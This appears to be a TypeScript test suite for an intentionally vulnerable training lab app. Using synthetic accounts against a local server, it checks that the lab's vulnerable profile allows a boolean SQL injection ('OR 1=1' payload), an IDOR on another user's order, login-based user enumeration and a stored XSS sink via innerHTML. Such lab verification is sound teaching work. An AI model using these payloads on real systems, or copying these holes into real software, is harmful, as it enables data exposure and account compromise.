const active = process.env.LAB_PROFILE_TEST === 'vulnerable';
const describeVulnerable = active ? describe : describe.skip;
const base = process.env.LAB_BASE_URL ?? 'http://127.0.0.1:3000';
const signal = () => AbortSignal.timeout(5_000);

async function login(email = 'alice.learner@example.test', password = 'Synthetic-Alice-2026!') {
  const response = await fetch(`${base}/api/auth/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password }), signal: signal() });
  return { response, body: await response.json() as { accessToken?: string; message?: string } };
}

describeVulnerable('preuves contrôlées du profil vulnérable', () => {
  test('SQLi booléenne non destructive élargit le résultat', async () => {
    const normal = await fetch(`${base}/api/catalog?q=Sécurité`, { signal: signal() }).then((r) => r.json()) as unknown[];
    const proof = await fetch(`${base}/api/catalog?q=${encodeURIComponent("x%' OR '1'='1' -- ")}`, { signal: signal() }).then((r) => r.json()) as unknown[];
    expect(normal).toHaveLength(1);
    expect(proof.length).toBeGreaterThan(normal.length);
  });
  test('IDOR expose la commande synthétique de Bob à Alice', async () => {
    const { body } = await login();
    const response = await fetch(`${base}/api/orders/30000000-0000-4000-8000-000000000002`, { headers: { authorization: `Bearer ${body.accessToken}` }, signal: signal() });
    expect(response.status).toBe(200);
    expect(await response.text()).toContain('Commande synthétique Bob');
  });
  test('authentification permet une énumération bornée', async () => {
    const absent = await login('absent@example.test', 'Synthetic-Invalid-2026!');
    const wrong = await login('alice.learner@example.test', 'Synthetic-Invalid-2026!');
    expect(absent.response.status).toBe(401);
    expect(wrong.response.status).toBe(401);
    expect(absent.body.message).not.toBe(wrong.body.message);
  });
  test('sink XSS conserve une chaîne inoffensive contrôlée', async () => {
    const { body } = await login();
    const marker = '<b data-proof="synthetic-xss">preuve locale</b>';
    await fetch(`${base}/api/profile/bio`, { method: 'POST', headers: { authorization: `Bearer ${body.accessToken}`, 'content-type': 'application/json' }, body: JSON.stringify({ bio: marker }), signal: signal() });
    const profile = await fetch(`${base}/api/profile`, { headers: { authorization: `Bearer ${body.accessToken}` }, signal: signal() }).then((r) => r.json()) as { bio: string };
    expect(profile.bio).toBe(marker);
    expect(readFileSync('apps/web-client/app.vulnerable.js', 'utf8')).toContain("innerHTML=data.bio");
  });
});
import { readFileSync } from 'node:fs';
